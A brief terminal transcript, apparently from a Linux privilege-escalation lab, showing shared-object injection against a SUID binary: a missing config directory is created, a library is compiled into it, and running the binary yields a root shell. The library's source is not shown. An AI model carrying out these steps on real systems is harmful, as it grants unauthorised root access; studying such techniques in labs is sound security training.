```
$ ls -la /usr/local/bin/suid-so
$ mkdir /home/user/.config
$ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/libcalc.c
$ /usr/local/bin/suid-so
Calculating something, please wait...
# whoami
root
```
